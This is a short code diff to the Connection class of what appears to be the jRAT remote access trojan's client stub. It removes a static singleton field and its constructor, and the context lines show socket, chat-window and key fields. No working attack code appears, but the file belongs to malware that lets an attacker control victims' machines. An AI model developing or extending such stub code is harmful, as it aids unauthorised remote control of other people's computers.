@@ -43,9 +43,7 @@ import se.jrat.stub.packets.outgoing.Packet8InitCountry;
 import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
 
 public class Connection implements Runnable {
-	
-	public static Connection instance;
-	
+		
 	private Socket socket;
 	private FrameChat frameChat;
 
@@ -56,10 +54,6 @@ public class Connection implements Runnable {
 	private DataOutputStream dos;
 
 	public PublicKey pubKey;
-	
-	public Connection() {
-		instance = this;
-	}
 	
 	public void run() {
 		try {
